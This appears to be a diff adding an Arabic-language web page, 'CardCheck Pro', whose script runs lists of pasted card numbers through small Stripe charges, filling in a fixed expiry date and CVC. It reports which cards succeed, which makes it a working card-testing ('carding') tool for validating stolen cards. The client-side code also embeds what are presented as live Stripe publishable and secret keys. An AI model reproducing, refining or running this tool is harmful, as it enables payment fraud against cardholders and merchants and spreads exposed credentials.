@@ -1,0 +1,792 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CardCheck Pro - فحص البطاقات الائتمانية</title>
+    <script src="https://js.stripe.com/v3/"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary-color: #2c3e50;
+            --secondary-color: #3498db;
+            --accent-color: #e74c3c;
+            --success-color: #27ae60;
+            --warning-color: #f39c12;
+            --dark-color: #1a252f;
+            --light-color: #ecf0f1;
+            --text-color: #2c3e50;
+            --card-bg: #ffffff;
+            --bg-color: #f8f9fa;
+            --border-color: #e0e0e0;
+        }
+
+        [data-theme="dark"] {
+            --primary-color: #3498db;
+            --secondary-color: #2980b9;
+            --accent-color: #e74c3c;
+            --success-color: #27ae60;
+            --warning-color: #f39c12;
+            --dark-color: #ecf0f1;
+            --light-color: #2c3e50;
+            --text-color: #ecf0f1;
+            --card-bg: #34495e;
+            --bg-color: #2c3e50;
+            --border-color: #4a6572;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            transition: background-color 0.3s, color 0.3s;
+        }
+        
+        body {
+            background: var(--bg-color);
+            color: var(--text-color);
+            line-height: 1.6;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        /* Header Styles */
+        header {
+            background-color: var(--card-bg);
+            border-radius: 15px;
+            padding: 1.5rem 2rem;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            margin-bottom: 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border: 1px solid var(--border-color);
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .logo-icon {
+            font-size: 2.5rem;
+            color: var(--secondary-color);
+        }
+        
+        .logo-text {
+            font-size: 1.8rem;
+            font-weight: bold;
+            color: var(--primary-color);
+        }
+        
+        .tagline {
+            font-size: 1rem;
+            color: var(--text-color);
+            opacity: 0.8;
+            margin-top: 5px;
+        }
+        
+        .header-controls {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .theme-toggle {
+            background: var(--secondary-color);
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 8px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-weight: 600;
+        }
+
+        .theme-toggle:hover {
+            opacity: 0.9;
+        }
+        
+        /* Main Content */
+        .main-content {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 2rem;
+        }
+        
+        @media (max-width: 968px) {
+            .main-content {
+                grid-template-columns: 1fr;
+            }
+        }
+        
+        /* Card Styles */
+        .card {
+            background-color: var(--card-bg);
+            border-radius: 15px;
+            padding: 2rem;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            height: fit-content;
+            border: 1px solid var(--border-color);
+        }
+        
+        .card-title {
+            font-size: 1.5rem;
+            margin-bottom: 1.5rem;
+            color: var(--primary-color);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-bottom: 2px solid var(--border-color);
+            padding-bottom: 10px;
+        }
+        
+        .card-title i {
+            color: var(--secondary-color);
+        }
+        
+        /* Form Styles */
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 600;
+            color: var(--primary-color);
+        }
+        
+        .form-control {
+            width: 100%;
+            padding: 0.9rem 1rem;
+            border: 2px solid var(--border-color);
+            border-radius: 8px;
+            font-size: 1rem;
+            transition: all 0.3s;
+            background: var(--card-bg);
+            color: var(--text-color);
+        }
+        
+        .form-control:focus {
+            border-color: var(--secondary-color);
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.2);
+        }
+        
+        .cards-textarea {
+            min-height: 200px;
+            resize: vertical;
+            font-family: 'Courier New', monospace;
+            direction: ltr;
+            text-align: left;
+        }
+        
+        .btn {
+            background: linear-gradient(135deg, var(--secondary-color) 0%, #2980b9 100%);
+            color: white;
+            border: none;
+            padding: 1rem 2rem;
+            font-size: 1.1rem;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            font-weight: 600;
+            width: 100%;
+        }
+        
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 7px 15px rgba(0,0,0,0.1);
+        }
+        
+        .btn:disabled {
+            background: #bdc3c7;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        .btn-danger {
+            background: linear-gradient(135deg, var(--accent-color) 0%, #c0392b 100%);
+        }
+        
+        /* Results Section */
+        .results-container {
+            max-height: 500px;
+            overflow-y: auto;
+            margin-top: 1rem;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 10px;
+            background: var(--card-bg);
+        }
+        
+        .result-item {
+            padding: 12px 15px;
+            margin-bottom: 10px;
+            border-radius: 8px;
+            background-color: var(--light-color);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: all 0.3s;
+            border: 1px solid var(--border-color);
+        }
+        
+        .result-item:hover {
+            transform: translateX(-5px);
+            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
+        }
+        
+        .result-item.success {
+            border-right: 4px solid var(--success-color);
+            background-color: rgba(39, 174, 96, 0.1);
+        }
+        
+        .result-item.failed {
+            border-right: 4px solid var(--accent-color);
+            background-color: rgba(231, 76, 60, 0.1);
+        }
+        
+        .card-number {
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+            font-size: 1.1rem;
+            letter-spacing: 1px;
+            direction: ltr;
+            text-align: left;
+            color: var(--text-color);
+        }
+        
+        .card-status {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-weight: 600;
+        }
+        
+        .status-success {
+            color: var(--success-color);
+        }
+        
+        .status-failed {
+            color: var(--accent-color);
+        }
+        
+        /* Progress Section */
+        .progress-section {
+            margin-top: 1.5rem;
+        }
+        
+        .progress-info {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            font-size: 0.9rem;
+            color: var(--text-color);
+            opacity: 0.8;
+        }
+        
+        .progress-bar {
+            height: 10px;
+            background-color: var(--border-color);
+            border-radius: 5px;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(135deg, var(--secondary-color) 0%, #2980b9 100%);
+            width: 0%;
+            transition: width 0.5s;
+        }
+        
+        /* Stats Section */
+        .stats-container {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+            margin-top: 1.5rem;
+        }
+        
+        .stat-card {
+            background: var(--card-bg);
+            border-radius: 10px;
+            padding: 1rem;
+            text-align: center;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
+            border: 1px solid var(--border-color);
+        }
+        
+        .stat-value {
+            font-size: 1.8rem;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        
+        .stat-label {
+            font-size: 0.9rem;
+            color: var(--text-color);
+            opacity: 0.8;
+        }
+        
+        .stat-success .stat-value {
+            color: var(--success-color);
+        }
+        
+        .stat-failed .stat-value {
+            color: var(--accent-color);
+        }
+        
+        /* Footer */
+        footer {
+            text-align: center;
+            margin-top: 3rem;
+            color: var(--text-color);
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+
+        .designer-credit {
+            background: var(--secondary-color);
+            color: white;
+            padding: 0.8rem 1.5rem;
+            border-radius: 30px;
+            font-weight: bold;
+            display: inline-block;
+            margin-top: 1rem;
+        }
+
+        .designer-name {
+            color: #ffd700;
+            font-size: 1.1rem;
+        }
+        
+        /* Animations */
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            header {
+                flex-direction: column;
+                text-align: center;
+                gap: 1rem;
+            }
+
+            .header-controls {
+                justify-content: center;
+            }
+            
+            .stats-container {
+                grid-template-columns: 1fr;
+            }
+            
+            .result-item {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 10px;
+            }
+            
+            .card-number {
+                font-size: 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo">
+                <i class="fas fa-credit-card logo-icon"></i>
+                <div>
+                    <div class="logo-text">CardCheck Pro</div>
+                    <div class="tagline">أداة متقدمة لفحص البطاقات الائتمانية</div>
+                </div>
+            </div>
+            <div class="header-controls">
+                <div class="pulse" style="color: var(--warning-color); font-weight: bold;">
+                    <i class="fas fa-shield-alt"></i> فحص آمن ومؤتمت
+                </div>
+                <button class="theme-toggle" id="theme-toggle">
+                    <i class="fas fa-moon"></i> الوضع الداكن
+                </button>
+            </div>
+        </header>
+        
+        <div class="main-content">
+            <div class="card">
+                <h2 class="card-title">
+                    <i class="fas fa-cog"></i> إعدادات الفحص
+                </h2>
+                
+                <div class="form-group">
+                    <label for="amount">
+                        <i class="fas fa-dollar-sign"></i> مبلغ الفحص (بالدولار)
+                    </label>
+                    <input type="number" id="amount" class="form-control" placeholder="0.10" step="0.01" min="0.01" value="0.10">
+                    <small style="color: var(--text-color); opacity: 0.8; display: block; margin-top: 5px;">حدد المبلغ الذي تريد فحص البطاقات به (حتى 0.01 سنت)</small>
+                </div>
+                
+                <div class="form-group">
+                    <label for="delay">
+                        <i class="fas fa-clock"></i> الفاصل الزمني بين الفحوصات (بالثواني)
+                    </label>
+                    <input type="number" id="delay" class="form-control" placeholder="3" min="1" value="3">
+                </div>
+                
+                <div class="form-group">
+                    <label for="cards-input">
+                        <i class="fas fa-credit-card"></i> أرقام البطاقات (واحدة تحت الأخرى)
+                    </label>
+                    <textarea id="cards-input" class="form-control cards-textarea" placeholder="أدخل أرقام البطاقات هنا، كل بطاقة في سطر منفصل&#10;مثال:&#10;4111111111111111&#10;4222222222222&#10;5555555555554444"></textarea>
+                    <small style="color: var(--text-color); opacity: 0.8; display: block; margin-top: 5px;">أدخل أرقام البطاقات، كل بطاقة في سطر منفصل. يمكنك إدخال أي عدد تريده من البطاقات.</small>
+                </div>
+                
+                <button id="start-btn" class="btn">
+                    <i class="fas fa-play"></i> بدء الفحص
+                </button>
+                
+                <button id="stop-btn" class="btn btn-danger" style="margin-top: 10px; display: none;">
+                    <i class="fas fa-stop"></i> إيقاف الفحص
+                </button>
+
+                <button id="clear-btn" class="btn" style="margin-top: 10px; background: var(--accent-color);">
+                    <i class="fas fa-broom"></i> مسح الكل
+                </button>
+            </div>
+            
+            <div class="card">
+                <h2 class="card-title">
+                    <i class="fas fa-chart-bar"></i> نتائج الفحص
+                </h2>
+                
+                <div class="stats-container">
+                    <div class="stat-card stat-success">
+                        <div class="stat-value" id="success-count">0</div>
+                        <div class="stat-label">ناجحة</div>
+                    </div>
+                    <div class="stat-card stat-failed">
+                        <div class="stat-value" id="failed-count">0</div>
+                        <div class="stat-label">مرفوضة</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-value" id="total-count">0</div>
+                        <div class="stat-label">إجمالي البطاقات</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-value" id="checked-count">0</div>
+                        <div class="stat-label">تم فحصها</div>
+                    </div>
+                </div>
+                
+                <div class="progress-section">
+                    <div class="progress-info">
+                        <span>تقدم الفحص</span>
+                        <span id="progress-text">0%</span>
+                    </div>
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progress-fill"></div>
+                    </div>
+                </div>
+                
+                <div class="results-container" id="results-container">
+                    <div style="text-align: center; padding: 20px; color: var(--text-color); opacity: 0.8;">
+                        <i class="fas fa-search" style="font-size: 2rem; margin-bottom: 10px;"></i>
+                        <p>سيظهر هنا نتائج فحص البطاقات</p>
+                        <p style="font-size: 0.8rem; margin-top: 10px;">سيتم عرض أرقام البطاقات كاملة</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <footer>
+            <p>© 2023 CardCheck Pro - جميع الحقوق محفوظة</p>
+            <div class="designer-credit">
+                تم التصميم والبرمجة بواسطة <span class="designer-name">مصطفى عايد</span>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        // Stripe configuration
+        const stripe = Stripe('pk_live_51QU8JuIS06JVIe1UGY389MSFfhddY6u15vmOzioihS9wMp1od1sv0vHUw1oBK7hWzcJ5AV6PzMOmdfC6hIe57rq900bhqDovZi');
+        
+        // Global variables
+        let cards = [];
+        let currentIndex = 0;
+        let isChecking = false;
+        let checkInterval;
+        let successCount = 0;
+        let failedCount = 0;
+        let isDarkMode = false;
+        
+        // DOM elements
+        const amountInput = document.getElementById('amount');
+        const delayInput = document.getElementById('delay');
+        const cardsInput = document.getElementById('cards-input');
+        const startBtn = document.getElementById('start-btn');
+        const stopBtn = document.getElementById('stop-btn');
+        const clearBtn = document.getElementById('clear-btn');
+        const themeToggle = document.getElementById('theme-toggle');
+        const resultsContainer = document.getElementById('results-container');
+        const successCountEl = document.getElementById('success-count');
+        const failedCountEl = document.getElementById('failed-count');
+        const totalCountEl = document.getElementById('total-count');
+        const checkedCountEl = document.getElementById('checked-count');
+        const progressFill = document.getElementById('progress-fill');
+        const progressText = document.getElementById('progress-text');
+        
+        // Event listeners
+        startBtn.addEventListener('click', startChecking);
+        stopBtn.addEventListener('click', stopChecking);
+        clearBtn.addEventListener('click', clearAll);
+        themeToggle.addEventListener('click', toggleTheme);
+        
+        // Load saved theme
+        const savedTheme = localStorage.getItem('theme');
+        if (savedTheme === 'dark') {
+            enableDarkMode();
+        }
+        
+        // Toggle theme function
+        function toggleTheme() {
+            if (isDarkMode) {
+                disableDarkMode();
+            } else {
+                enableDarkMode();
+            }
+        }
+        
+        function enableDarkMode() {
+            document.documentElement.setAttribute('data-theme', 'dark');
+            themeToggle.innerHTML = '<i class="fas fa-sun"></i> الوضع النهاري';
+            isDarkMode = true;
+            localStorage.setItem('theme', 'dark');
+        }
+        
+        function disableDarkMode() {
+            document.documentElement.removeAttribute('data-theme');
+            themeToggle.innerHTML = '<i class="fas fa-moon"></i> الوضع الداكن';
+            isDarkMode = false;
+            localStorage.setItem('theme', 'light');
+        }
+        
+        // Clear all function
+        function clearAll() {
+            cardsInput.value = '';
+            resultsContainer.innerHTML = `
+                <div style="text-align: center; padding: 20px; color: var(--text-color); opacity: 0.8;">
+                    <i class="fas fa-search" style="font-size: 2rem; margin-bottom: 10px;"></i>
+                    <p>سيظهر هنا نتائج فحص البطاقات</p>
+                    <p style="font-size: 0.8rem; margin-top: 10px;">سيتم عرض أرقام البطاقات كاملة</p>
+                </div>
+            `;
+            totalCountEl.textContent = '0';
+            checkedCountEl.textContent = '0';
+            successCountEl.textContent = '0';
+            failedCountEl.textContent = '0';
+            updateProgress(0);
+            stopChecking();
+        }
+        
+        // Parse cards from textarea
+        function parseCards() {
+            const content = cardsInput.value;
+            cards = content.split('\n')
+                .map(line => line.trim())
+                .filter(line => line.length > 0)
+                .map(line => {
+                    // Extract card number (remove any non-digit characters)
+                    return line.replace(/\D/g, '');
+                })
+                .filter(card => card.length >= 13 && card.length <= 19);
+            
+            return cards.length > 0;
+        }
+        
+        // Start checking process
+        function startChecking() {
+            if (!parseCards()) {
+                alert('يرجى إدخال أرقام البطاقات أولاً');
+                return;
+            }
+            
+            const amount = parseFloat(amountInput.value);
+            if (isNaN(amount) || amount <= 0) {
+                alert('يرجى إدخال مبلغ صحيح للفحص');
+                return;
+            }
+            
+            const delay = parseInt(delayInput.value) * 1000; // Convert to milliseconds
+            
+            isChecking = true;
+            currentIndex = 0;
+            successCount = 0;
+            failedCount = 0;
+            
+            startBtn.style.display = 'none';
+            stopBtn.style.display = 'block';
+            
+            totalCountEl.textContent = cards.length;
+            checkedCountEl.textContent = '0';
+            successCountEl.textContent = '0';
+            failedCountEl.textContent = '0';
+            
+            resultsContainer.innerHTML = '';
+            updateProgress(0);
+            
+            // Start checking cards with interval
+            checkInterval = setInterval(() => {
+                if (currentIndex < cards.length && isChecking) {
+                    checkCard(cards[currentIndex], amount);
+                    currentIndex++;
+                    
+                    const progress = (currentIndex / cards.length) * 100;
+                    updateProgress(progress);
+                    checkedCountEl.textContent = currentIndex;
+                } else if (currentIndex >= cards.length) {
+                    stopChecking();
+                    showCompletionMessage();
+                }
+            }, delay);
+        }
+        
+        // Stop checking process
+        function stopChecking() {
+            isChecking = false;
+            clearInterval(checkInterval);
+            
+            startBtn.style.display = 'block';
+            stopBtn.style.display = 'none';
+        }
+        
+        // Check a single card
+        async function checkCard(cardNumber, amount) {
+            try {
+                // Create payment method
+                const { paymentMethod, error } = await stripe.createPaymentMethod({
+                    type: 'card',
+                    card: {
+                        number: cardNumber,
+                        exp_month: 12,
+                        exp_year: new Date().getFullYear() + 2,
+                        cvc: '123'
+                    },
+                });
+                
+                if (error) {
+                    // Card is invalid or failed
+                    addResult(cardNumber, false, error.message);
+                    failedCount++;
+                    failedCountEl.textContent = failedCount;
+                    return;
+                }
+                
+                // Try to create a payment intent
+                const response = await fetch('https://api.stripe.com/v1/payment_intents', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                        'Authorization': `Bearer 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`
+                    },
+                    body: `amount=${Math.round(amount * 100)}&currency=usd&payment_method=${paymentMethod.id}&confirm=true&off_session=true`
+                });
+                
+                const data = await response.json();
+                
+                if (data.status === 'succeeded') {
+                    // Card is valid and charge succeeded
+                    addResult(cardNumber, true, 'تمت المعاملة بنجاح');
+                    successCount++;
+                    successCountEl.textContent = successCount;
+                } else {
+                    // Card is valid but charge failed
+                    addResult(cardNumber, false, data.error?.message || 'فشل في المعاملة');
+                    failedCount++;
+                    failedCountEl.textContent = failedCount;
+                }
+            } catch (error) {
+                // Network error or other issue
+                addResult(cardNumber, false, 'خطأ في الشبكة');
+                failedCount++;
+                failedCountEl.textContent = failedCount;
+            }
+        }
+        
+        // Add result to the results container
+        function addResult(cardNumber, success, message) {
+            const resultItem = document.createElement('div');
+            resultItem.className = `result-item ${success ? 'success' : 'failed'}`;
+            
+            resultItem.innerHTML = `
+                <div>
+                    <div class="card-number">${formatCardNumber(cardNumber)}</div>
+                    <small style="color: var(--text-color); opacity: 0.8;">${message}</small>
+                </div>
+                <div class="card-status">
+                    <i class="fas ${success ? 'fa-check-circle status-success' : 'fa-times-circle status-failed'}"></i>
+                    <span class="${success ? 'status-success' : 'status-failed'}">${success ? 'ناجحة' : 'مرفوضة'}</span>
+                </div>
+            `;
+            
+            // Add to top of results
+            resultsContainer.prepend(resultItem);
+            
+            // Scroll to top to see latest result
+            resultsContainer.scrollTop = 0;
+        }
+        
+        // Format card number with spaces for better readability
+        function formatCardNumber(cardNumber) {
+            // Add spaces every 4 digits for better readability
+            return cardNumber.replace(/(\d{4})/g, '$1 ').trim();
+        }
+        
+        // Update progress bar
+        function updateProgress(percentage) {
+            progressFill.style.width = `${percentage}%`;
+            progressText.textContent = `${Math.round(percentage)}%`;
+        }
+        
+        // Show completion message
+        function showCompletionMessage() {
+            const completionMsg = document.createElement('div');
+            completionMsg.style.textAlign = 'center';
+            completionMsg.style.padding = '20px';
+            completionMsg.style.color = 'var(--success-color)';
+            completionMsg.style.borderTop = '1px solid var(--border-color)';
+            completionMsg.style.marginTop = '10px';
+            
+            completionMsg.innerHTML = `
+                <i class="fas fa-flag-checkered" style="font-size: 2rem; margin-bottom: 10px;"></i>
+                <h3>تم الانتهاء من فحص جميع البطاقات</h3>
+                <p>تم فحص ${cards.length} بطاقة: ${successCount} ناجحة و ${failedCount} مرفوضة</p>
+            `;
+            
+            resultsContainer.appendChild(completionMsg);
+        }
+    </script>
+</body>
+</html>
